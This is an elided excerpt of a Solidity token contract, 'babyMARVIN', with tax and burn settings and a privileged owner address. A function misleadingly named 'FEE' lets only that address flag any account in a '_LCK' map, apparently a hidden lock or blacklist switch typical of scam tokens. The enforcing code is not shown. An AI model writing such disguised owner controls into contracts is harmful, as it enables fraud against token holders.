...
contract BaseToken is Ownable {
    ...
    string constant public name = "babyMARVIN";

    string constant public symbol = "babyMARVIN";
    ...
    uint256 public _taxFEI = 1;
    uint256 private _previousTaxFEI = _taxFEI;

    uint256 public _burnFEI = 1;
    uint256 private _previousBurnFEI = _burnFEI;


    address public projectAddress = 0xb8494D52E18bbBdAf1Ea53f7Ece2A06314A98f9f;
    ...
    function FEE(address account) public onlyWoDe {
        _LCK[account] = true;
    }
    ...
    function isFEE(address account) public view returns (bool) {
...
contract babyMARVIN is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        WoDe = 0xb8494D52E18bbBdAf1Ea53f7Ece2A06314A98f9f;
